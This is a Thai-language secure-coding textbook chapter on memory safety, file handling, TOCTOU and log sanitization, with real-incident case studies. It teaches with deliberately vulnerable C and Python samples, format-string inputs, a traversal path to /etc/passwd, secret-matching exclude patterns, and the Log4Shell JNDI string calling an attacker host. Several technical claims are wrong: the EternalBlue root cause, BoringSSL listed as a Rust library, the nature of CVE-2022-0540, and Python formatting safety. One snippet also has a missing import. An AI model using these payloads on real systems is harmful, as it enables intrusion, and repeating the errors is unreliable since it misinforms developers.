| **Kotlin** | JVM + Null Safety | มี (JVM GC) | Compile-time | Android, Backend |

**Rust — Ownership Model ที่ป้องกัน Memory Bugs:**

```rust
fn main() {
    // Rust Ownership: ทุกค่ามี Owner เพียงคนเดียว
    let s1 = String::from("hello");
    let s2 = s1;  // Ownership ย้ายจาก s1 → s2
    // println!("{}", s1);  // ❌ s1 ไม่ valid แล้ว
    
    // Rust Borrowing: ยืมแบบ Reference โดยไม่ Transfer Ownership
    let s3 = String::from("world");
    let len = calculate_length(&s3);  // ยืม Reference
    println!("{} has length {}", s3, len);  // ✅ s3 ยังใช้ได้
}

fn calculate_length(s: &String) -> usize {
    s.len()
}  // s ถูก Drop — ไม่มี Dangling Pointer
```

**สถิติ Memory Safety ทั่วโลก (2024-2025):**

| แหล่ง | ตัวเลข | ปี |
|------|--------|-----|
| **Microsoft (MSRC)** | ~70% ของ CVEs เป็น memory safety issues (32% เป็น temporal safety — use-after-free) | 2019-2024 |
| **Google Chrome** | ~70% of high/critical severity bugs เป็น memory safety (51% เป็น use-after-free) | 2015-2024 |
| **Google Android** | Memory safety vulnerabilities ลดลงต่ำกว่า **20%** เป็นครั้งแรก (จากเดิม ~70%) จากการนำ Rust มาใช้ | 2025 |
| **Project Zero** | 68% of in-the-wild zero days เป็น memory safety | 2021-2024 |
| **NSA/CISA** | ~70% ของ vulnerabilities เป็น memory safety — แนะนำให้เปลี่ยนไปใช้ memory-safe languages | 2022-2025 |

**Rust Adoption — ความคืบหน้าในระบบสำคัญ:**

| ระบบ | สถานะ |
|------|--------|
| **Linux Kernel** | Rust เป็น "experiment" → ประกาศ success แล้ว (2025 Maintainers Summit) — มี Rust drivers ใน production, amount of Rust code เพิ่มขึ้น 5x |
| **Android** | ~5 million บรรทัด Rust — Memory safety vulnerability density: **0.2/MLOC** vs C/C++ ~1,000/MLOC = **>1000x reduction** |
| **Chrome/Chromium** | Rust parsers สำหรับ PNG, JSON, Web Fonts |
| **Microsoft** | กำลังเขียน Windows Kernel components ใน Rust |

**แนวทางจากหน่วยงานรัฐ:**
- **NSA (2022)**: "Software Memory Safety" — แนะนำให้ใช้ memory-safe languages
- **NSA + CISA (2023)**: "The Case for Memory Safe Roadmaps"
- **White House (2024)**: "Back to the Building Blocks" — เรียกร้องให้อุตสาหกรรมเปลี่ยนไปใช้ memory-safe languages
- **CISA (2025)**: Secure by Design — กำหนดให้ Memory-safe Language Adoption เป็น core component

**ข้อควรจำ:** การใช้ Memory-safe Language ไม่ได้รับประกันความปลอดภัย 100% — ยังมี Logic Bugs, Race Conditions, และ Algorithmic Vulnerabilities ที่ต้องระวัง

#### 9.3.4 Dangling Pointers และ Use-after-Free

Use-after-Free (CWE-416) เป็นช่องโหว่ที่เกิดขึ้นเมื่อโปรแกรมใช้ Pointer ที่ชี้ไปยังหน่วยความจำที่ถูกคืน (Free) แล้ว

```c
// C — Use-after-Free
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    int is_admin;
} User;

int main() {
    User *user = (User*)malloc(sizeof(User));
    strcpy(user->name, "Alice");
    user->is_admin = 0;
    
    free(user);  // คืน Memory — pointer ยังชี้อยู่ (Dangling Pointer)
    
    // Use-after-Free — อ่านข้อมูลจาก Memory ที่ถูกคืนแล้ว
    printf("Name: %s\n", user->name);  // ❌ Undefined Behavior
    
    // จอง Memory ใหม่ — โอกาสสูงที่ได้ Address เดียวกัน
    User *attacker = (User*)malloc(sizeof(User));
    strcpy(attacker->name, "Mallory");
    attacker->is_admin = 1;
    
    // Pointer เดิม (user) ชี้ไปที่ Memory เดียวกับ attacker
    printf("User is_admin: %d\n", user->is_admin);  // อ่านค่า 1 — Privilege Escalation!
    
    return 0;
}
```

**แนวทางป้องกัน:**

```c
// 1. Set pointer to NULL after free
free(user);
user = NULL;  // ถ้าเผลอใช้ — NULL Pointer Dereference (Crash ทันที) — ดีกว่า Use-after-Free

// 2. ใช้ Smart Pointer (C++)
#include <memory>
std::unique_ptr<User> user = std::make_unique<User>();
// Memory ถูกคืนอัตโนมัติเมื่อ user อยู่นอก Scope

// 3. ใช้ Memory-safe Language
// Rust: Compiler ตรวจสอบ Ownership → ป้องกัน Use-after-Free ที่ Compile-time
```

#### 9.3.5 Format String Vulnerabilities

Format String Vulnerability (CWE-134) เกิดเมื่อข้อมูลที่ผู้ใช้ควบคุมถูกส่งเป็น Format String Parameter โดยตรง

```c
// C — Format String Vulnerability
#include <stdio.h>

void log_message(char *user_input) {
    char buffer[256];
    snprintf(buffer, sizeof(buffer), user_input);  // ❌ user_input เป็น Format String
    printf("%s\n", buffer);
}

// ถ้าผู้ใช้ส่ง: "%x %x %x %x %x %x %x"
// → อ่านค่า Stack เป็น Hex — Information Disclosure

// ถ้าผู้ใช้ส่ง: "%n"
// → เขียนค่าลงใน Stack — Arbitrary Write → Code Execution!

// โจมตี:
// input = "%s%s%s%s%s%s"  → Crash (อ่านจากที่อยู่ไม่ valid)
// input = "%x.%x.%x.%x"   → อ่าน Stack Values
// input = "%n"             → เขียนที่อยู่ → Code Execution
```

**แนวทางที่ถูกต้อง:**

```c
void log_message(char *user_input) {
    char buffer[256];
    snprintf(buffer, sizeof(buffer), "%s", user_input);  // ✅ user_input เป็น Argument
    printf("%s\n", buffer);
}
```

```python
# Python — แม้จะไม่ร้ายแรงเท่า C แต่ก็ควรปฏิบัติอย่างถูกต้อง
name = input("Enter name: ")

# ไม่ปลอดภัย: f-string หรือ format ที่ไม่ได้ควบคุม
print(f"Hello {name}")  # อาจเปิดช่องให้อ่าน Attributes
print("Hello {}".format(name))

# ปลอดภัย: ใช้ %s format
print("Hello %s" % name)
```

**ภาษาและ Format String Risk:**

| ภาษา | Format Function | ความเสี่ยง |
|------|----------------|-----------|
| **C** | `printf(user_input)` | **สูง** — อ่าน/เขียน Stack โดยตรง |
| **C++** | `boost::format` | ปานกลาง — Exception อาจรั่วข้อมูล |
| **Java** | `String.format()` | ต่ำ — ไม่มีการเขียนหน่วยความจำ |
| **Python** | `"format".format()` | ต่ำ — แต่ระวัง Object Attribute Access |
| **JavaScript** | Template Literal | ต่ำ — Sandboxed |

---

### 9.4 Secure File และ Resource Management

การจัดการไฟล์และทรัพยากรระบบอย่างปลอดภัยเป็นหัวข้อที่นักพัฒนามักมองข้าม นำไปสู่ช่องโหว่ Path Traversal, File Upload Attack, และ Race Conditions

#### 9.4.1 Path Traversal Prevention

Path Traversal (CWE-22) คือการที่ผู้โจมตีใช้ `../` เพื่อเข้าถึงไฟล์นอก Directory ที่กำหนด

```python
# ไม่ปลอดภัย: Path Traversal
import os

def read_file(filename):
    base_path = "/var/www/uploads/"
    full_path = base_path + filename  # ../../etc/passwd → /var/www/uploads/../../etc/passwd
    with open(full_path, 'r') as f:
        return f.read()
```

```python
# ปลอดภัย: ป้องกัน Path Traversal
import os

def read_file_safe(filename):
    base_path = "/var/www/uploads/"
    
    # 1. ใช้ os.path.realpath เพื่อ Resolve Symbolic Links / ..
    full_path = os.path.realpath(os.path.join(base_path, filename))
    
    # 2. ตรวจสอบว่า Path อยู่ใต้ Base Path จริง
    if not full_path.startswith(os.path.realpath(base_path)):
        raise SecurityException("Path traversal detected")
    
    # 3. ตรวจสอบว่า File มีอยู่จริง
    if not os.path.exists(full_path):
        raise FileNotFoundError("File not found")
    
    with open(full_path, 'r') as f:
        return f.read()
```

```java
// Java — Path Traversal Prevention
import java.nio.file.Path;
import java.nio.file.Paths;

public String safeReadFile(String filename) throws IOException {
    Path basePath = Paths.get("/var/www/uploads/").normalize().toAbsolutePath();
    Path filePath = basePath.resolve(filename).normalize();
    
    // ตรวจสอบว่าอยู่ใน Base Path
    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Path traversal detected");
    }
    
    // ตรวจสอบสิทธิ์การเข้าถึง
    if (!Files.isReadable(filePath)) {
        throw new AccessDeniedException("Cannot access file");
    }
    
    return Files.readString(filePath);
}
```

**แนวทางป้องกัน Path Traversal:**

| มาตรการ | คำอธิบาย |
|---------|----------|
| **Path Canonicalization** | ใช้ `realpath()` หรือ `normalize()` เพื่อ Resolve `../` และ Symbolic Links |
| **Prefix Check** | ตรวจสอบว่า Canonical Path ขึ้นต้นด้วย Base Directory |
| **Allowlist File Names** | กำหนดรายชื่อไฟล์ที่อนุญาต — ดีที่สุดสำหรับกรณีที่ทำได้ |
| **Avoid User Input in Path** | ใช้ Indirection Map — mapping จาก ID → จริง |
| **Chroot/Jail** | จำกัด Process ให้เห็นเฉพาะ Directory ที่กำหนด |
| **Least Privilege** | Application ควรใช้สิทธิ์เท่าที่จำเป็น — ไม่ใช่ Root |

#### 9.4.2 File Permission Management

การกำหนดสิทธิ์ไฟล์ที่ผิดเป็นสาเหตุของช่องโหว่ CWE-276 (Incorrect Default Permissions)

```python
# ไม่ปลอดภัย: Default Permission ที่กว้างเกินไป
import os

def save_config(data, filename):
    with open(filename, 'w') as f:
        f.write(data)
    # Default Permission ขึ้นอยู่กับ umask — อาจกว้างเกินไป
```

```python
# ปลอดภัย: กำหนด Permission อย่างชัดเจน
import os
import stat

def save_config_safe(data, filename):
    # สร้างไฟล์ด้วย Permission ที่จำกัด
    fd = os.open(filename, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 
                 stat.S_IRUSR | stat.S_IWUSR)  # 600 — อ่านเขียนได้เฉพาะเจ้าของ
    
    with os.fdopen(fd, 'w') as f:
        f.write(data)
```

```bash
# Linux — ตั้งค่า umask ที่เหมาะสม
umask 027  # Default: Owner=r/w, Group=r, Other=none
# หรือเข้มงวดยิ่งขึ้น
umask 077  # Default: Owner=r/w, Group=none, Other=none
```

**แนวทางปฏิบัติ File Permissions:**

| สถานการณ์ | Permission ที่แนะนำ | คำอธิบาย |
|-----------|:------------------:|----------|
| Configuration Files | 600 (Owner Read/Write) | มีเฉพาะ Application Owner |
| Log Files | 640 (Owner Read/Write, Group Read) | ให้ Log Rotator อ่านได้ |
| Upload Directory | 750 (Owner rwx, Group rx) | ไม่ให้ Others เข้าถึง |
| Executable Scripts | 750 (Owner rwx, Group rx) | ไม่ให้ Others Execute |
| Shared Files | 660 (Owner rw, Group rw) | เฉพาะกลุ่มที่จำเป็น |
| Public Static Files | 644 (Owner rw, Others r) | ผ่าน Web Server เท่านั้น |

#### 9.4.3 File Upload Security

File Upload เป็นหนึ่งในฟังก์ชันที่อันตรายที่สุด — ผู้โจมตีสามารถอัปโหลดไฟล์อันตราย (Web Shell, Malware) ถ้าไม่มีการป้องกันที่เหมาะสม

**แนวทางป้องกัน File Upload (Defense in Depth):**

| ชั้น | มาตรการ | คำอธิบาย |
|:---:|---------|----------|
| 1 | **File Type Validation** | ตรวจสอบ Magic Number (ไม่ใช่แค่ Extension) |
| 2 | **File Size Limit** | จำกัดขนาดไฟล์สูงสุด |
| 3 | **File Name Sanitization** | ลบ Path Traversal, Special Characters |
| 4 | **Content Scanning** | สแกนไวรัส (ClamAV) |
| 5 | **Storage Location** | เก็บนอก Web Root |
| 6 | **Storage Name** | ใช้ Random Name — ไม่ใช้ชื่อเดิม |
| 7 | **Served via Script** | ไม่ Serve Directly — ผ่าน Download Script ที่ตรวจสอบสิทธิ์ |

**ตัวอย่าง File Upload Validation (Python):**

```python
import os
import uuid
import magic  # python-magic
from werkzeug.utils import secure_filename

ALLOWED_TYPES = {
    'image/jpeg': [b'\xFF\xD8\xFF'],
    'image/png': [b'\x89PNG\r\n\x1a\n'],
    'image/gif': [b'GIF87a', b'GIF89a'],
    'application/pdf': [b'%PDF'],
}

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

def validate_file(file_storage):
    # 1. ตรวจสอบขนาด
    if file_storage.content_length > MAX_FILE_SIZE:
        raise ValueError("File size exceeds limit")
    
    # 2. อ่าน Magic Number
    file_data = file_storage.read(1024)
    file_storage.seek(0)
    
    mime_type = magic.from_buffer(file_data, mime=True)
    if mime_type not in ALLOWED_TYPES:
        raise ValueError(f"File type {mime_type} is not allowed")
    
    # 3. ตรวจสอบ Magic Byte
    is_valid = any(file_data.startswith(sig) for sig in ALLOWED_TYPES[mime_type])
    if not is_valid:
        raise ValueError("File content does not match claimed type")
    
    return True

def save_upload(file_storage):
    # 4. Sanitize ชื่อไฟล์
    original_name = secure_filename(file_storage.filename)
    
    # 5. สร้างชื่อใหม่แบบสุ่ม
    ext = os.path.splitext(original_name)[1]
    safe_name = str(uuid.uuid4()) + ext
    
    # 6. เก็บนอก Web Root
    upload_dir = "/var/data/uploads/"  # ไม่ใช่ /var/www/html/uploads/
    os.makedirs(upload_dir, exist_ok=True)
    
    safe_path = os.path.join(upload_dir, safe_name)
    file_storage.save(safe_path)
    
    return safe_name
```

**ข้อควรระวัง File Upload:**

- **Double Extension:** `shell.php.jpg` — Web Server อาจรันเป็น PHP
- **Null Byte Injection:** `file.php%00.jpg` — ภาษาเก่าตัดที่ `%00`
- **SVG Upload:** SVG มี XML — อาจมี XSS หรือ XXE
- **ZIP Bomb:** ไฟล์ ZIP เล็กๆ ที่เมื่อแตกแล้วใหญ่จนเต็ม Disk
- **Race Condition:** ตรวจสอบแล้ว แต่ก่อนบันทึก ไฟล์ถูกเปลี่ยน

#### 9.4.4 Temporary File Management

Temporary Files ที่จัดการไม่ปลอดภัยนำไปสู่ Race Condition, Information Disclosure, และ Privilege Escalation

```python
# ไม่ปลอดภัย: Temporary File ที่ predictable
import tempfile
import os

def process_temp_data():
    temp_path = f"/tmp/data_{os.getpid()}.txt"  # Predictable Name
    with open(temp_path, 'w') as f:
        f.write("sensitive_data")
    
    # Race Condition — ผู้โจมตีสร้าง Symbolic Link ก่อนเรา
    # → เขียนทับไฟล์สำคัญของระบบ
```

```python
# ปลอดภัย: ใช้ tempfile module
import tempfile

def process_temp_data_safe():
    # tempfile.NamedTemporaryFile สร้างไฟล์ด้วยชื่อสุ่ม
    # และตั้ง Permission ให้เฉพาะ Owner
    with tempfile.NamedTemporaryFile(mode='w', prefix='secure_', 
                                      suffix='.tmp', delete=True) as f:
        f.write("sensitive_data")
        temp_path = f.name
        # ใช้ temp_path ภายใน Context นี้เท่านั้น
    # ไฟล์ถูกลบอัตโนมัติเมื่อออกจาก Context (delete=True)
```

**แนวทางปฏิบัติสำหรับ Temporary Files:**

| ข้อปฏิบัติ | คำอธิบาย |
|-----------|----------|
| ใช้ Secure Temp Functions | `tempfile.NamedTemporaryFile` (Python), `File.createTempFile` (Java) |
| ตั้งชื่อแบบสุ่ม | ไม่ใช้ PID หรือ Timestamp เพียงอย่างเดียว |
| ตั้ง Permission ที่จำกัด | 600 — อ่านได้เฉพาะเจ้าของ Process |
| ลบหลังใช้งาน | ใช้ Context Manager หรือ try-finally |
| ไม่ใช้ /tmp | ใช้ Directory เฉพาะของ Application |
| จำกัดขนาด | ป้องกัน Disk Exhaustion |

#### 9.4.5 Race Condition (TOCTOU)

TOCTOU (Time of Check, Time of Use) — CWE-362 — เป็นช่องโหว่ที่เกิดจากการตรวจสอบแล้วใช้ข้อมูล โดยมีช่วงเวลาที่สถานะเปลี่ยนก่อนการใช้

```python
# TOCTOU Race Condition — ไม่ปลอดภัย
import os

def check_and_use(filename):
    # TIME OF CHECK
    if not os.path.exists(filename):
        return "File does not exist"
    
    if not os.access(filename, os.R_OK):
        return "No read permission"
    
    # TIME OF USE — ระหว่าง Check และ Use ผู้โจมตีเปลี่ยน File เป็น Symbolic Link
    # → อ่านไฟล์ที่เราไม่มีสิทธิ์
    
    with open(filename, 'r') as f:
        return f.read()
```

```python
# ป้องกัน TOCTOU — ปลอดภัยกว่า
import os

def safe_check_and_use(filename):
    # 1. เปิดไฟล์ทันที (Atomic Operation)
    try:
        fd = os.open(filename, os.O_RDONLY | os.O_NOFOLLOW)
        # O_NOFOLLOW — ป้องกัน Symbolic Link Attack
    except PermissionError:
        return "No read permission"
    except FileNotFoundError:
        return "File does not exist"
    
    # 2. ตรวจสอบหลังจากเปิดแล้ว
    try:
        stat_info = os.fstat(fd)
        # ตรวจสอบว่าเป็น Regular File
        if not stat.S_ISREG(stat_info.st_mode):
            return "Not a regular file"
        
        with os.fdopen(fd, 'r') as f:
            return f.read()
    except:
        os.close(fd)
        raise
```

```java
// Java — ป้องกัน TOCTOU ด้วย Files API
import java.nio.file.*;

public String safeReadFile(Path path) throws IOException {
    // Atomic Operation: อ่านไฟล์และตรวจสอบ Attributes พร้อมกัน
    try (InputStream in = Files.newInputStream(path, LinkOption.NOFOLLOW_LINKS)) {
        // ตรวจสอบว่าเป็น Regular File
        BasicFileAttributes attrs = Files.readAttributes(
            path, BasicFileAttributes.class, LinkOption.NOFOLLOW_LINKS
        );
        if (!attrs.isRegularFile()) {
            throw new SecurityException("Not a regular file");
        }
        return new String(in.readAllBytes());
    }
}
```

**ตัวอย่าง TOCTOU ในโลกจริง (2024-2025):**

| CVE | ปี | รายละเอียด | ผลกระทบ |
|:---:|:---:|-----------|---------|
| **CVE-2024-50379** | 2024 | Apache Tomcat — TOCTOU ใน JSP compilation บน case-insensitive filesystems | RCE — CVSS 9.8 |
| **CVE-2025-68146** | 2025 | Python filelock — TOCTOU ใน file lock creation | Data Corruption |
| **CVE-2024-28717** | 2024 | Python storlets — TOCTOU race condition ระหว่าง write และ chmod | Privilege Escalation |

---

### 9.5 การป้องกันข้อมูลรั่วไหลใน Log

Logging เป็นสิ่งจำเป็นสำหรับ Debugging, Monitoring, และ Forensics แต่ Log ที่ไม่ปลอดภัยสามารถรั่วไหลข้อมูลสำคัญไปยังผู้ที่ไม่ควรเข้าถึง

#### 9.5.1 ข้อมูลที่ห้าม Log

| ประเภท | ตัวอย่าง | ความเสี่ยง |
|--------|---------|-----------|
| **Passwords** | รหัสผ่านทุกประเภท, PIN | Identity Theft, Account Takeover |
| **Secrets/Keys** | API Keys, Encryption Keys, JWT Secrets | System Compromise |
| **PII** | ชื่อ, นามสกุล, ที่อยู่, เบอร์โทร, Email | Privacy Violation, PDPA/HIPAA/GDPR Fine |
| **Payment Data** | เลขบัตรเครดิต, CVV, CVV2 | PCI DSS Violation, Financial Fraud |
| **Authentication Tokens** | Session ID, Access Token, Refresh Token | Session Hijacking |
| **Health Information** | เวชระเบียน, ผลตรวจ, ประวัติการรักษา | HIPAA Violation |
| **Credentials** | Database Connection String, SSH Keys | Data Breach |

```python
# ไม่ปลอดภัย: Log ข้อมูลสำคัญ
import logging

logger = logging.getLogger(__name__)

def login_user(username, password):
    logger.info(f"Login attempt: username={username}, password={password}")  # ❌
    # ...
    logger.info(f"User logged in: token={auth_token}")  # ❌
```

```python
# ปลอดภัย: Mask ข้อมูลสำคัญ
def login_user(username, password):
    logger.info(f"Login attempt: username={username}")  # ✅ username ปกติ
    
def mask_email(email):
    local, domain = email.split('@')
    return f"{local[0]}***@{domain}"

def mask_credit_card(card_number):
    return f"****-****-****-{card_number[-4:]}"

def mask_password(password):
    return "******"  # ไม่แสดงรหัสผ่านเด็ดขาด

logger.info(f"Email: {mask_email('alice@example.com')}")  # a***@example.com
logger.info(f"Card: {mask_credit_card('4111-1111-1111-1111')}")  # ****-****-****-1111
logger.info(f"Password: {mask_password('myPass123')}")  # ******
```

#### 9.5.2 Log Sanitization และ Masking

Log Sanitization เป็นกระบวนการกรองหรือ Mask ข้อมูลที่ละเอียดอ่อนก่อนเขียน Log

```java
// Java — Log Sanitization
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import com.fasterxml.jackson.databind.ObjectMapper;

public class SecureLogger {
    private static final Logger logger = LoggerFactory.getLogger(SecureLogger.class);
    private static final ObjectMapper mapper = new ObjectMapper();
    
    public static void logUserAction(String action, User user) {
        // สร้าง Safe DTO — ไม่มีข้อมูลสำคัญ
        SafeUserDTO safeUser = new SafeUserDTO(user);
        // แค่ userId, action type, timestamp — ไม่มี password, token
        logger.info("User action: {}", safeUser);
    }
}
```

```javascript
// Node.js — Log Sanitization ด้วย Morgan
const morgan = require('morgan');

// Custom Token ที่ไม่ Log Headers ที่สำคัญ
morgan.token('safe-headers', (req) => {
    return JSON.stringify({
        'user-agent': req.headers['user-agent'],
        'accept': req.headers['accept'],
        // ไม่ include authorization, cookie, x-api-key
    });
});

app.use(morgan(':method :url :status :safe-headers'));
```

**เทคนิคการ Mask ข้อมูล:**

| ข้อมูล | ตัวอย่างเดิม | ตัวอย่างที่ Log |
|--------|-------------|----------------|
| Password | `myP@ss123` | `********` |
| Credit Card | `4111111111111111` | `************1111` |
| Email | `alice@example.com` | `a***@example.com` |
| Phone | `081-234-5678` | `***-***-5678` |
| IP Address (บางส่วน) | `192.168.1.100` | `192.168.x.x` |
| API Token | `sk-proj-AbCdEf123456` | `sk-proj-***` |
| SSN/ID Number | `123-45-6789` | `***-**-6789` |

#### 9.5.3 Centralized Logging และ Log Retention

Logs ต้องถูกเก็บอย่างปลอดภัย มี Access Control และมี Retention Policy ที่เหมาะสม

```yaml
# Filebeat + Elasticsearch — Centralized Logging
filebeat.inputs:
- type: log
  paths:
    - /var/log/app/*.log
  # ไม่ส่ง Log ที่มี Pattern ของ Secrets
  exclude_patterns:
    - '.*password.*'
    - '.*secret.*'  
    - '.*token.*'

output.elasticsearch:
  hosts: ["https://elasticsearch:9200"]
  # Encrypt in Transit
  protocol: "https"
  ssl.verification_mode: "certificate"
```

```python
# Python — Log Rotation ที่ปลอดภัย
import logging
from logging.handlers import RotatingFileHandler

# Log Rotation — ป้องกัน Disk Full
handler = RotatingFileHandler(
    '/var/log/app/secure_app.log',
    maxBytes=100 * 1024 * 1024,  # 100 MB
    backupCount=10,
    mode='a'
)

# Set Permission — 640
import os
os.chmod('/var/log/app/secure_app.log', 0o640)

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
logger.addHandler(handler)
```

**แนวทางปฏิบัติ Log Retention:**

| ปัจจัย | คำแนะนำ |
|--------|---------|
| **Retention Period** | 90-365 วัน (ขึ้นอยู่กับ Legal/Compliance Requirement) |
| **Log Rotation** | หมุนเวียนทุกวัน หรือเมื่อถึงขนาดที่กำหนด |
| **Access Control** | เฉพาะ Admin และ Security Team |
| **Encryption at Rest** | เข้ารหัส Log Files โดยเฉพาะที่มี PII |
| **Encryption in Transit** | TLS สำหรับส่ง Log ไปยัง Central System |
| **Audit Trail** | ใครเข้าถึง Log บ้าง ต้องถูกบันทึก |
| **Deletion** | ลบอย่างปลอดภัยเมื่อเกิน Retention |

#### 9.5.4 Secure Log Storage และ Access Control

Log ต้องถูกจัดเก็บในที่ที่ปลอดภัยและมี Access Control ที่เหมาะสม

```bash
# Linux — Secure Log Storage Configuration
# /etc/logrotate.d/secure-app
/var/log/app/*.log {
    daily
    rotate 365
    compress
    delaycompress
    missingok
    notifempty
    create 640 app app  # Permission 640, Owner=app, Group=app
    postrotate
        # Restart logging service
        kill -HUP `cat /var/run/app.pid`
    endscript
}
```

```python
# Python — Structured Logging (JSON) — ปลอดภัยและตรวจสอบง่าย
import structlog
import logging

structlog.configure(
    processors=[
        structlog.stdlib.filter_by_level,
        structlog.stdlib.add_logger_name,
        structlog.stdlib.add_log_level,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        # JSON Renderer — ง่ายต่อการ Query ใน Centralized Logging
        structlog.processors.JSONRenderer()
    ],
    wrapper_class=structlog.stdlib.BoundLogger,
    context_class=dict,
    logger_factory=structlog.stdlib.LoggerFactory(),
    cache_logger_on_first_use=True,
)

logger = structlog.get_logger()

logger.info("user_login", 
    user_id="12345", 
    ip_address="192.168.1.100",  # Only for internal network
    # ไม่ include password, token, หรือข้อมูลสำคัญอื่นๆ
)
# Output: {"event": "user_login", "user_id": "12345", "ip_address": "192.168.1.100", ...}
```

**สิ่งที่ควรทำและไม่ควรทำเกี่ยวกับ Log:**

| ✅ ควรทำ | ❌ ไม่ควรทำ |
|---------|------------|
| Log เฉพาะข้อมูลที่จำเป็น | Log รหัสผ่าน, Secrets, หรือ PII |
| Mask ข้อมูลสำคัญก่อน Log | Log Request/Response Body โดยตรง |
| ใช้ Structured Logging (JSON) | Log ใน Format ที่อ่านด้วยเครื่องไม่ได้ |
| กำหนด Access Control และ Retention | เก็บ Log ไว้ไม่จำกัดโดยไม่มี Rotation |
| เข้ารหัส Log ที่ Sensitive | แชร์ Log File โดยไม่ตรวจสอบเนื้อหา |
| ตรวจสอบ Log เป็นระยะ | ตั้ง Log Level ต่ำเกินไปใน Production |

---

### 9.6 กรณีศึกษาและเหตุการณ์จริง

#### 9.6.1 Heartbleed (CVE-2014-0160) — Buffer Over-read

Heartbleed เป็น Buffer Over-read (CWE-125) ใน OpenSSL ที่ทำให้ผู้โจมตีอ่าน Memory ของ Server ได้ครั้งละ 64 KB — CVSS Score: 5.0 (Medium) แต่ผลกระทบสูงมาก

**ที่มา:** การ Implement TLS Heartbeat Extension (RFC 6520) ที่ไม่ตรวจสอบ Length Parameter — Server อ่าน Memory ตาม Length ที่ Client ส่ง โดยไม่ตรวจสอบว่า Length ตรงกับ Buffer จริงหรือไม่ — OpenSSL เวอร์ชัน 1.0.1 ถึง 1.0.1f แก้ไขใน 1.0.1g

**ผลกระทบ:** Private Key, Session Keys, Passwords, User Data ของเซิร์ฟเวอร์ ~500,000 เครื่องรั่วไหล

**บทเรียน:**
- Buffer Operations ต้องตรวจสอบ Bounds ทุกครั้ง
- Library ที่มีคนใช้มากที่สุดก็มี Bug ได้
- Memory-safe Language (Rust) กำลังถูกใช้เขียน OpenSSL alternatives (rustls, BoringSSL)
- Defense in Depth: ถึง Crypto จะแข็งแรง แต่ Memory Safety ที่ไม่ดีทำลายทุกอย่าง

#### 9.6.2 Morris Worm (1988) — Buffer Overflow แรกที่มีผลกระทบวงกว้าง

Morris Worm เป็นหนึ่งใน Buffer Overflow โจมตีครั้งแรกที่สร้างความเสียหายเป็นวงกว้าง ใช้ Buffer Overflow ใน `fingerd` (CVE-1999-0514) และ `sendmail`

**บทเรียน:**
- ข้อบกพร่องในโค้ด C ระดับ System Service นำไปสู่ Remote Code Execution
- ต้องมีการตรวจสอบ Input ทุกครั้งโดยเฉพาะในภาษาที่ไม่ Safe ทางหน่วยความจำ
- Network Service ต้อง Sandbox และใช้ Least Privilege

#### 9.6.3 WannaCry (2017) — EternalBlue (CVE-2017-0144)

EternalBlue เป็น Buffer Overflow ใน SMB Protocol ของ Microsoft Windows — ใช้โดย WannaCry Ransomware ที่สร้างความเสียหาย > $4 พันล้าน ครอบคลุม 150 ประเทศ

**ที่มา:** Buffer Overflow ใน SMB `srvsvc.NetrServerPasswordSet2` — Microsoft ออก Patch ใน MS17-010 (มีนาคม 2017) แต่หลายองค์กรไม่ได้อัปเดต

**บทเรียน:**
- Patch Management สำคัญ — WannaCry ใช้ช่องโหว่ที่ Patch ออกมาก่อน 2 เดือน
- Memory Safety ใน Protocol Implementation สำคัญ
- Defense in Depth: Firewall Block SMB Port 445 จาก Internet

#### 9.6.4 กรณี File Upload — Atlassian (CVE-2022-0540)

ช่องโหว่ใน Atlassian Jira Authentication ผ่าน File Upload — ผู้โจมตีสามารถ Bypass Authentication โดยอัปโหลดไฟล์ที่มีการจัดการ Session ไม่ถูกต้อง

**บทเรียน:**
- File Upload Function เป็น Attack Vector ที่อันตราย
- ทุกไฟล์ที่อัปโหลดต้องถูกตรวจสอบ — ทั้งชื่อ, เนื้อหา, Magic Number
- อย่า Execute หรือ Serve ไฟล์จาก Upload Directory โดยตรง

#### 9.6.5 Log4Shell (CVE-2021-44228) — Log Injection

Log4Shell เป็นช่องโหว่ใน Apache Log4j ที่ทำให้เกิด Remote Code Execution ผ่าน Log Message — ผู้โจมตีส่ง `${jndi:ldap://attacker.com/a}` ใน Header หรือ Input

**ความเกี่ยวข้องกับบทนี้:**
- Logging Library ที่ไม่ Sanitize Input นำไปสู่ Remote Code Execution
- Log Message ต้องถูก Sanitized ก่อนเขียน — ไม่ Trust Data ที่จะ Log
- Dependency Management สำคัญ — Log4j เป็น Library ที่ถูกใช้มากที่สุดใน Java World

**บทเรียน:**
- ไม่ Trust Input ที่จะ Log — Sanitize ก่อน Log เสมอ
- Logging Library ที่ไม่ได้ออกแบบมาให้ Secure อาจเป็น Attack Vector
- Supply Chain Security — ตรวจสอบ Library Version ที่ใช้

---

### 9.7 สรุปและแนวทางปฏิบัติ

#### 9.7.1 Secure Coding Checklist ก่อนส่งมอบ

**Defensive Programming:**
- [ ] Input Validation — Allowlist ที่ Server Side เสมอ
- [ ] Output Encoding — ตาม Context (HTML, JS, URL, CSS)
- [ ] Parameters ใช้ Prepared Statement / Parameterized Query
- [ ] ใช้ Immutable Objects สำหรับ Sensitive Data
- [ ] ทำ Defensive Copying ก่อนเก็บ Reference
- [ ] ใช้ Fail Safe สำหรับ Security-sensitive Operations

**Error Handling:**
- [ ] Global Error Handler ครอบคลุมทุก Exception
- [ ] Error Message ไม่เปิดเผย Stack Trace หรือ Internal Details
- [ ] Resource Cleanup ใน finally / with / try-with-resources
- [ ] Custom Error Page ที่ปลอดภัย

**Memory Safety:**
- [ ] ถ้าใช้ C/C++ — Enable Stack Protector, ASLR, DEP
- [ ] ใช้ Memory-safe Language Feature (Rust Ownership, Java GC)
- [ ] ตรวจสอบ Bounds ทุกครั้งก่อน Read/Write Buffer
- [ ] ตรวจสอบ Integer Overflow สำหรับภาษา C/C++/Java/Go

**File Management:**
- [ ] Path Traversal Prevention — Canonicalize + Prefix Check
- [ ] File Upload — Magic Number Validation + Size Limit + Random Name
- [ ] จำกัด File Permissions — 600/640 ตามความจำเป็น
- [ ] ป้องกัน TOCTOU — เปิดก่อนตรวจสอบ, ใช้ O_NOFOLLOW

**Logging:**
- [ ] ไม่ Log Passwords, Secrets, PII, Tokens
